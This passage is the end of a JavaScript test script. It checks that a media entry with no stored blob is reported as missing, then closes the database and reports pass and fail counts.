    check('a media entry with a name and no blob is listed as missing',
        stats.missingMedia.includes('gone.png'), JSON.stringify(stats.missingMedia));
}

db.close();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
